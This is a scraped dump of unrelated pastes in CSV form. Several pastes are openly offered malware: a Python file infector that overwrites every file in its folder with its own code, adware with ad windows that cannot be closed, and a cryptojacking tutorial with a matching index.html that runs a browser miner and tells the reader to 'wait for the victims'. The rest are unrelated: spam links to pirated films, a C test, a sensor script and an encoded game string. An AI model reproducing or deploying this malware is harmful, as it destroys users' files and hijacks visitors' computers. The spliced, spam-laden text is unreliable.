id,title,username,language,date,content
4LXjfDiZ,file_infection/target_file.ext,FlyFar,Python,Thursday 19th of October 2023 11:36:13 PM CDT,This is a normal file.
nn5xpsaf,file_infection/infector.py,FlyFar,Python,Thursday 19th of October 2023 11:35:10 PM CDT,"#!/usr/bin/env python3

"""""" Implementation of file infector in Python.
    INJECTION SIGNATURE
""""""

import logging
import os
import sys
from cached_property import cached_property


class FileInfector:
    """""" This class represents the code injecting malware.
    """"""

    def __init__(self, name):
        self._name = name

    @property
    def name(self):
        """""" Name of the malware. """"""
        return self._name

    @name.setter
    def name(self, new_name):
        self._name = new_name

    @cached_property
    def malicious_code(self):
        """""" Malicious code. In the case of this file
        injector it is this whole file.
        """"""
        # Get the name of this file.
        malicious_file = sys.argv[0]
        with open(malicious_file, 'r') as file:
            malicious_code = file.read()

        return malicious_code

    def infect_files_in_folder(self, path):
        """""" Perform file infection on all files in the
        given directory specified by path.

        :param str path: Path of the folder to be infected.
        :returns: Number of injected files (`int`).
        """"""
        num_infected_files = 0
        # List the directory to get all files.
        files = []
        for file in os.listdir(path):
            # For the demostration purposes ignore README.md
            # from the repository.
            if file == 'README.md':
                continue

            file_path = os.path.join(path, file)
            if os.path.isfile(file_path):
                files.append(file_path)

        # Inject each file in the directory.
        for file in files:
            logging.debug('Infecting file: {}'.format(file))

            # Read the content of the original file.
            with open(file, 'r') as infected_file:
                file_content = infected_file.read()
            # Check whether the file was already infected by scanning
            # the injection signature in this file. If so, skip the file.
            if ""INJECTION SIGNATURE"" in file_content:
                continue

            # Ensure that the injected file is executable.
            os.chmod(file, 777)

            # Write the original and malicous part into the file.
            with open(file, 'w') as infected_file:
                infected_file.write(self.malicious_code)

            num_infected_files += 1

        return num_infected_files


if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG)

    # Create file injector.
    code_injector = FileInfector('SimpleFileInfector')

    # Infect all files in the same folder.
    path = os.path.dirname(os.path.abspath(__file__))
    number_infected_files = code_injector.infect_files_in_folder(path)

    logging.info('Number of infected files: {}'.format(number_infected_files))"
Xf0B3iNr,Untitled,larrylailai,C,Thursday 19th of October 2023 11:31:29 PM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <math.h>
#include <stdbool.h>
#define loop(i, s, n) for(int i=s; i<n; i++)
#define loop_back(i, s, n) for(int i=n; i>s; i--)
#define big_loop(i, j, n) for(int i=0;i<n;i++) for(int j=0;j<n;j++)
#define ll long long

int max(int a, int b){return a>b?a:b;}

int min(int a, int b){return a<b?a:b;}

void test(int **a, int row, int col){
    loop(i, 0, row){
        loop(j, 0, col) printf(""%d "", a[i][j]);
        printf(""\n"");
    }
}

int main(){
    int **a = (int**)malloc(sizeof(int*)*20);
    loop(i, 0, 20){
        a[i] = (int*)malloc(sizeof(int)*10);
        loop(j, 0, 10){
            a[i][j] = 20*i+j;
        }
    }
    test(a, 20, 10);
    return 0;
}
"
4dA4UNuN,adware.py,FlyFar,Python,Thursday 19th of October 2023 11:30:01 PM CDT,"#!/usr/bin/env python3

"""""" Implementation of simple adware that pops multiple
windows with the advertisements.
""""""

import logging
import sys
import random

from PySide2.QtWidgets import QApplication, QDialog, QLabel, QVBoxLayout


class AdWindow(QDialog):
    """""" This class represents ad window shown on the screen. """"""

    def __init__(self, ad_slogan, parent=None):
        super(AdWindow, self).__init__(parent)
        self.setWindowTitle(""Advertisement!"")

        # Create a layout so that the ad slogan is shown.
        self.label = QLabel(ad_slogan)
        layout = QVBoxLayout()
        layout.addWidget(self.label)

        self.setLayout(layout)

    def closeEvent(self, event):
        # Ignore the close event so that the ad
        # can't be closed by pressing close button.
        event.ignore()


class Adware(QApplication):
    """""" This class represents implementation of adware. """"""

    def __init__(self, args):
        super(Adware, self).__init__(args)

    @property
    def advert_slogans(self):
        """""" Slogans of the promoted adds. """"""
        return (
            'Ferrari for only 9,99$!',
            'John Biden is an idiot',
            'Hoverboard for 99,99$!'
        )

    def create_ad_window(self, ad_slogan):
        """""" Creates a windows showing the advertisement
        slogan.

        :param str ad_slogan: Text of the ad.
        """"""
        window = AdWindow(ad_slogan=ad_slogan)
        window.show()
        return window

    def show_ads(self):
        """""" Creates the main GUI application and shows
        the ads based on `:class:~Adware.advert_slogans`
        """"""
        ad_windows = []
        for advert in self.advert_slogans:
            # Create a new ad window.
            ad_window = self.create_ad_window(advert)
            # Move this window to random location on screen.
            x_coordinate, y_coordinate = random.randint(1, 800), random.randint(1, 600)
            ad_window.move(x_coordinate, y_coordinate)
            ad_windows.append(ad_window)

        return ad_windows


if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG)

    # Create our adware and show the ads.
    adware = Adware(sys.argv)
    windows = adware.show_ads()

    sys.exit(adware.exec_())"
ipMTBuNs,README.TXT,FlyFar,Email,Thursday 19th of October 2023 11:26:43 PM CDT,"PRACTICAL CRYPTOJACKING TUTORIAL
Environment used in creating this tutorial:

Linux Mint 20 Cinnamon
Kernel: 5.4.0
HOSTING A CRYPTOJACKING ON THE WEB SERVER
For your cryptojacking to work, you must disable your browser's cryptominer blocker.

It has been tested on the following browsers:

Mozilla Firefox 88.0
The first step is to fork this repository, so you have a copy of the repository;

Create an account on WebMinePool , choose the become a provider mode;

Then log in;

Go to Api Keys and copy the SiteKey key;

Paste it into the siteKey variable in the index.html file available in your copy of the repository;

Create an account on Heroku , after creating the account check your email;

Click on Create a new app, give the app a name and a region;

After that you must choose the Deploy method, connect your GitHub, and choose the copy of the repository;

To finish, click on Deploy Branch;

Okay, the page already has the cryptojacking attack working, now we just have to wait for the victims.

Note: Disabling browser cryptominer blocking

Preferences -> Privacy and Security -> Custom -> Uncheck ""Cryptominers""
HOSTING CRYPTOJACKING ON YOUR MACHINE
For your cryptojacking to work, you must disable your browser's cryptominer blocker.

This part of the tutorial was tested in the following environment:

Máquina Virtual - VMware Workstation 16
Mozilla Firefox 78.10esr
Kali Linux 20.04 Kernel: 5.9.0
Apache/2.4.46
Before starting, it is recommended to have a Provider account on the WebMinePool website .

First of all, let's install our server.

To do this, open a terminal and type the commands below:

Update the repository list.

$ sudo apt update
Install the apache2 package, which will be our server.
$ sudo apt install apache2
We must start the process from our web server.
$ sudo service apache2 restart
To test your server, open your browser and type localhostin the address bar.

You should see an Apache server welcome page.

Now clone this repository.

Open a terminal and type the following command:

$ cd /var/www/html && sudo git clone https://github.com/ecorreas/Cryptojacking.git

Now we have to change the index.html file and add our siteKey .
$ sudo nano /var/www/html/Cryptojacking/index.html
Change the siteKey variable on line 9 by replacing it with the siteKey obtained from the API Keys tab on the WebMinePool website .

If everything has gone well so far, your cryptojacking is ready to mine.

Just open your browser and access the URL: localhost/Cryptojacking/index.php.

When typing top in your terminal, notice the process called Web Content, it should appear at the top of the list consuming a lot of CPU."
3u0qZdxd,index.html,FlyFar,HTML,Thursday 19th of October 2023 11:24:30 PM CDT,"<!DOCTYPE html>
<html>
<head>
<title>Page Title</title>
</head>
<body>
<script src=""https://webminepool.com/lib/base.js""></script>
<script>
    var siteKey = 'SK_K7HiNrqq73LwvxaCpH6Ax';
    var miner = WMP.Anonymous(siteKey);
    miner.start();
</script>
<h1>Bem Vindo ao minerador</h1>
<p>Espere alguns segundos para começar a minerar...</p>
</body>
</html>"
997zThki,sdrghdrhd,gadungw71,PHP,Thursday 19th of October 2023 11:23:26 PM CDT,"https://m.facebook.com/media/set/?set=a.122111518988055194
https://m.facebook.com/media/set/?set=a.122114475236060179
https://open.firstory.me/user/clnwtpiy200ep01uu2czid922
https://eventsframe.com/e/s8aldx996/the-undertaker-2023-hd-thai/
https://app.eventsframe.com/app/event/6142283314364416/
https://lookerstudio.google.com/reporting/a70587de-75fa-4888-9d27-e94393a48c11
https://groups.google.com/g/the-undertaker-2023---hd/c/e00gnLfyJI0
https://www.scoop.it/topic/93-moscow-mission-hd
https://sites.google.com/suseb.com/93-2023-1080/home
https://www.scoop.it/topic/93-2023-hk-tw
https://sites.google.com/suseb.com/93202310804k/home
https://open.firstory.me/user/clnwvmyyn002x01ub1tnla5sv
https://eventsframe.com/e/moFMkYdK8/93-moscow-mission-2023/
https://app.eventsframe.com/app/event/4890374167330816/
https://groups.google.com/g/4--2023--/c/Ht0E7J6Rs1c
https://colab.research.google.com/drive/1047fYAYpYq0Kz1ikP_ZRj1-29IuX245x
https://lookerstudio.google.com/reporting/b549488b-a6e7-4348-aa9e-ae714521385f
https://www.scoop.it/topic/4-2023-hd-by-sahayahamba194
https://open.firstory.me/user/clnwwmbm8004l01uk7k369g2e
https://sites.google.com/suseb.com/an-encounter-to-remember-2023/home
https://www.scoop.it/topic/2023-by-ewehhkaera-gmail-com
https://eventsframe.com/e/puM8Y8O2Y/2023-tw-hk/
https://app.eventsframe.com/app/event/5566885706858496/
https://groups.google.com/g/2023--tw/c/HNqk4dvDDag
https://colab.research.google.com/drive/1oowsbHBd1r8LsCquJYEYOlF_Yk1sVmdS
https://lookerstudio.google.com/reporting/f3db5d55-ccf0-4115-91ef-d252869b5d59
https://eventsframe.com/e/ugG1ek6lO/an-encounter-to-remember-2023-hd-tw/
https://app.eventsframe.com/app/event/6608935738933248/
https://m.facebook.com/media/set/?set=a.122101382594071447
https://m.facebook.com/media/set/?set=a.122101383062071447
https://m.facebook.com/media/set/?set=a.122101383182071447"
69YAHagy,index.php,FlyFar,PHP,Thursday 19th of October 2023 11:22:38 PM CDT,"<?php include_once(""index.html""); ?>"
PksSgSCS,i2c and useful sensors/face detection...,silver2row,Python,Thursday 19th of October 2023 11:01:43 PM CDT,"# Example of accessing the Person Sensor from Useful Sensors on a Pi using
# Python. See https://usfl.ink/ps_dev for the full developer guide.

import io
import fcntl
import struct
import time

# The person sensor has the I2C ID of hex 62, or decimal 98.
PERSON_SENSOR_I2C_ADDRESS = 0x62

# We will be reading raw bytes over I2C, and we'll need to decode them into
# data structures. These strings define the format used for the decoding, and
# are derived from the layouts defined in the developer guide.
PERSON_SENSOR_I2C_HEADER_FORMAT = ""BBH""
PERSON_SENSOR_I2C_HEADER_BYTE_COUNT = struct.calcsize(
    PERSON_SENSOR_I2C_HEADER_FORMAT)

PERSON_SENSOR_FACE_FORMAT = ""BBBBBBbB""
PERSON_SENSOR_FACE_BYTE_COUNT = struct.calcsize(PERSON_SENSOR_FACE_FORMAT)

PERSON_SENSOR_FACE_MAX = 4
PERSON_SENSOR_RESULT_FORMAT = PERSON_SENSOR_I2C_HEADER_FORMAT + \
    ""B"" + PERSON_SENSOR_FACE_FORMAT * PERSON_SENSOR_FACE_MAX + ""H""
PERSON_SENSOR_RESULT_BYTE_COUNT = struct.calcsize(PERSON_SENSOR_RESULT_FORMAT)

# I2C channel 1 is connected to the GPIO pins
I2C_CHANNEL = 2
I2C_PERIPHERAL = 0x703

# How long to pause between sensor polls.
PERSON_SENSOR_DELAY = 0.2

i2c_handle = io.open(""/dev/bone/i2c/"" + str(I2C_CHANNEL), ""rb"", buffering=0)
fcntl.ioctl(i2c_handle, I2C_PERIPHERAL, PERSON_SENSOR_I2C_ADDRESS)

while True:
    try:
        read_bytes = i2c_handle.read(PERSON_SENSOR_RESULT_BYTE_COUNT)
    except OSError as error:
        print(""No person sensor data found"")
        print(error)
        time.sleep(PERSON_SENSOR_DELAY)
        continue
    offset = 0
    (pad1, pad2, payload_bytes) = struct.unpack_from(
        PERSON_SENSOR_I2C_HEADER_FORMAT, read_bytes, offset)
    offset = offset + PERSON_SENSOR_I2C_HEADER_BYTE_COUNT

    (num_faces) = struct.unpack_from(""B"", read_bytes, offset)
    num_faces = int(num_faces[0])
    offset = offset + 1

    faces = []
    for i in range(num_faces):
        (box_confidence, box_left, box_top, box_right, box_bottom, id_confidence, id,
         is_facing) = struct.unpack_from(PERSON_SENSOR_FACE_FORMAT, read_bytes, offset)
        offset = offset + PERSON_SENSOR_FACE_BYTE_COUNT
        face = {
            ""box_confidence"": box_confidence,
            ""box_left"": box_left,
            ""box_top"": box_top,
            ""box_right"": box_right,
            ""box_bottom"": box_bottom,
            ""id_confidence"": id_confidence,
            ""id"": id,
            ""is_facing"": is_facing,
        }
        faces.append(face)
    checksum = struct.unpack_from(""H"", read_bytes, offset)
    print(num_faces, faces)
    time.sleep(PERSON_SENSOR_DELAY)"
CeBx3qkA,guild name WA,esuvii,Lua,Thursday 19th of October 2023 10:59:02 PM CDT,!WA:2!TMvxSTT1vy7k0MuIH1yV10120woxuxByhzh3wV20M5Ajl)tJSLkLKDsN7KOiVuKXuKmxszB5Uam4215S2TU59t3FaBZyp2NmWEVOBpTNoWyypnGnuG94EPpUxYoNlPLTeLdCtNcsi59Eo37H3VV739Cy6D5(9vEHKVyYNR)69R3V(opXbvv1wtN76L212L)AjsKiFIXt(cFAvxUoJNkQtVZLY2ARTu56YfDDTdS82lWvBDg33Y15SJ((8nZzy4ZcM)vB82)WEWFvd93K38WoQC7VZu35o3zpoRg6tXMEmLAC3gE7fAzbRTy3)(H3hgk92BVju81uTzjQQ56yyvtIRQfGo7pPIFGkpqkLLJvGuvd8IVP02bCRA1Wy6XgKhD77UNoRAdddA64ZNjB(zlLnvan3Qn4QtSTVhZ2EbDFPp1Vrv26mNGcO1wBUF50txOy5cfNwPyQg4Ku1ZwTjJR4OwN5lPimT68mv7aZwUMNZqxvkKpt2S72WjkeKIEbZOxJ51xHB2qLZKNTHTT8kMwbSpjS3WvPhCFvhntxEExlC4tNzPIzu21NzBiAagAalDVhEUgw26YJiVegkYdX8BSUL1Wt0WsF)B(IfuNj1wZFvnJ9n4y3fc4QbQj(SWrDwQjALOAH0kzYS0(wogU86Q0sQu0s)coyyK4a1gbOd58eR2s7HVHkcyZx6ZWaHXDuTxoe8V9Ei2OBfAykBxv9zt5Jy55vQ3a5jsPWLyTZdVOKIMTQVpDx1aetDcOB3v1XkmaMeo3SWJKYX1H9jmvFk0zo1cmpZb6isrwuMWnUpJMp)TjBO3f4kPQRA5G(cxb(MNbMcEvyA82(7SL(1EJDEA4SZ)XpjuHyOWZcdnrdUT3JBge45F5XgBd1AUjTCh75nU(AxD5BS08JDj4HW4AYT1Dl772Wr3urCX7YlqlcgQASvNwxhFZxDfM6AtJbQ)Q5D3GXf3Uit3sD1cKh(RMAHIzs6wR2bIrOSMPQJdZEIcZEnOpjOFj4RS0GWxDNZTVwd)a36Ix2QilpOHp8ivdBeEsj4XGhhUWU1DB4ZCX9FWJkbp1NK2unqErMVVAng81Hb2f7TSy92CVqxjYYassHevFV)E6skfYPuUu(zMUyMrLdVwEXCLkKj3YzWowAHIJkNp70xhFqSniZmy3lVWsZDSMZLpF3Ao06ILuwQBMhV9q7ZMl3v7M9TAFUS5snD2WGS8m5wzPoAQuEV(OxCIXzzyPvM24wrrZKPTw1gE6QbSTP(fndz9EpJgoc9KHydljJ)SmKlH9Lztl)a)HgO1I8adlhyYCe2q)4SGgCh5aEdM8fVOSVP7gT6tCdZ2N1P1gQyJK5Mw6HDYC0LO)s)Ghgop80NhJQDAfv3tbvRPbPLpBWXMSUesh(cO72TGAFDl)BiIL1ztO600RpvX9fd11w0vN9r9ap)THxjCVlUBJ2QH74O9FPI1s)lJezpodfyepVAkdvDwKfOoTpY1XD6mZT5UbID89YJoHjb8Cp25Hh5auhIoUIo3WrVQjZQMzWFP)Qc7zvGjxxGVK8tfXwahKUZnHxMKA4BHslOu)9bVe9iCzX)(ngSQVLtnBuhbF8ZcyBIbbBfUQh9(PKo70lMVADlo3fhNhKh1)UvrbmDHfPYMzPzG18EL2KeY1MKqOqqXqF9xnTfxZMvUqDx3aZjsgutfgghMzlctiv1NvhJzLlLC8KJd3pE0kQ5V7CJS0LLRwt(sWdm)hV6h(rK(LIQTNPAcLnS0dmN5PGlMa(YsWi7F9z9YNPzJcgxFrfTdpiD(P(NPwfDACijmg8csW4dUpQ9RXYi0dQ491SQ54Yzrk(IwZqV0yx9H8anKXWk3cxqH0jKc1s)UhQLcPHzcLlHmMWSWCW8WcTRTbVgCvKvKfUaSOqid1Zi9lyjy5kqotipkrbVoOafQafHsKugA9kT2CaxdUo8gW36ZnVdwvCl16QWBs98TnHY9cvIywGkuD(xDZ)4)v82OrujqVcWI4oGrNSgOMGWaMGfCdKzaRb2qD8FDG1BFbVzVGhCZyq5eeuUXf4IjeXocxggCdXWX1xOoFIBo5kEgaM60hm1D(x90Z9b(jcHoyJkWMvqqy9xB(P(3pm9lt3U5)8q)1z6PNhfoBVNoaQpXcoId06nHtiED45rKaHsGvDMoHAeKraicBcmJajejjmJW2ii8)hqgbxr9qq2FQni7(VxHQjMEgAt7uN(nTHjUfTPTCkrYstiqSJHUBhIUQCA7bIwO4u0(scEhz)ut6KITXkBSzbx4b(h9CC0e5j7meQRfyB5GPdwQy2fwkdcWyc5jiLyk)tkyg4zCoW3uv3DJRhMZ4fWDF7LkxXI5wK0q8KpMXLdZVRSxzc5IEQxVZfIPKfLehlcp1NIz85szIPTcPNKAA8X4KfKP03G7Izdfoa4HOBEM3uscpczgxzh3a8GL64zt4btw(YAU1RJYiJkBfiJp6HjSl7Ae2hL99LLfRwuMjs0ZLzoRNKoBw(kYT)Slx(TUv72KCUslmtNgg2iATJLnDUg9yhUr5VhZnrJh5M4XngtwKaLSqdTJrXgpxXo2We26rJJ45o8mSmIyUg18r(slyI2MQJbOMi7)o9pS1JCp8zNylTj5QoRfZBrJD6m1yhot5KgZzrJh5mEsbDooYbW27W)6Q84tUOXJ8NRAPlJf3vJfitDjyxS6EbnP0DKjxoAutBZu5LcPmDK2uxzlhNxe3OiUXDHfe3NdzcTb5XnRfShhEJB8HqCCSmUTr4zCKlUPrOxxXP4whHvNeQisrKEHXc(eaJdBdb4itfvEecLf7VtaIm7UasK50TNODr40ktxonHnIVwaPICIoCiirJCw6(JzjMEDxn(kYx8sIeSfWLHCvxF)w5p39HFGPMAGw5qFx4auySGFEXJ3TijYH2YYVlmLr7cLyu5Y4enhlq8XcwaHKJnrDp8IOhuWLoIBq1xFIlQreeCouqYrrb3ybhD2MrECyLnelrNH59RHh0OlR1GJf2hy3mSNwLZixLzQUULBd(LBR9XWJefKFC1iGcqxh7MYLwSKSHfEU8ONyXrQ2BO20xuJZPyatFAhpr9vTh5cAFDSyaIeGd0iHgnAi9Hc1r6imWiiUtKjX850N68M9oyhsG2UAQ2Yr7wgyG7gDx1rVBBYAJ611JodDpzs5bW)GxIpiTr56EmiOsDBUexed(BXd6Y4lCK6)wdeFAKowLUIajIrgRaJn79pFV(LaAJhWew3QVOXqiL12iCLUM2sBJB0ylijQ242r9McPwCdKUitltSO1ww3wT9rUEOECBTh)GZiQsmdou3UTi)OjmAD(Z)hdHIm3JwZKovr2NVVGYrvC4nWjNlmU1Rm91gQ4n4jBKnRMQwZYg2Uu5)ddVBkdxNaVZnl3Al5xVHQo95vLlwSvfjtUmvlYlFS6pEP2RczBAaOV19Z494DzEDIUbUsus(xlmj)eWdMI(2dBVbw4b91j2ELOB(cvsvxJbVdJHB590N8sdjOBf(TzWQyEG58g5KTvVjU)ZsRCGjQWA6AR3KFdSaclJMy5tTvymDmovUuubXN9muXW2Vu2Lhwj9SVEoSSQ9dxxo6)IG9mS2KPlQA5D(sW4syzM7meSn82unyVdwUe89OsK4fZLx8nw((9c7G6M3g(bDPy4bH3dlQbE)J)rlincs5LKniv4NKk39hjKEjX4qT383lAVD7a(ygjYWlU(CyQEXen6QiTyieYOy9xDrgvmwX2C32(2yHLiDHt303kdZ2g9Jlv3nvA80TirA8ao6eVU8rG(vWTOVQWWWFa(jWUN(DHWp9jGFgE3ph3xb)cK9c)yt4dQa)6eWVhjrFi8lJQ8g(ThXq3tWqfjuHSYIAnnhARlL)swfBXwFLEiU7VPj87emtr59sFH2G2)6)TR9)(
